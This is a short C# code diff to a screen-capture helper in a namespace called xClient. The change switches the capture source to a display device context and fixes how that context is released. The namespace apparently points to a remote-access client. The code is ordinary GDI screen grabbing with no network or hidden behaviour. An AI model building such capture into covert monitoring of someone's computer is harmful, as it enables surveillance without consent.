@@ -12,18 +12,17 @@ namespace xClient.Core.Helper
         public static Bitmap CaptureScreen(int screenNumber)
         {
             Rectangle bounds = GetBounds(screenNumber);
-            IntPtr desktopHandle = NativeMethods.GetDesktopWindow();
             Bitmap screen = new Bitmap(bounds.Width, bounds.Height);
 
             using (Graphics g = Graphics.FromImage(screen))
             {
                 IntPtr destDeviceContext = g.GetHdc();
-                IntPtr srcDeviceContext = NativeMethods.GetWindowDC(desktopHandle);
+                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
 
                 NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                     bounds.Y, SRCCOPY);
-                NativeMethods.ReleaseDC(desktopHandle, srcDeviceContext);
 
+                NativeMethods.DeleteDC(srcDeviceContext);
                 g.ReleaseHdc(destDeviceContext);
             }
 
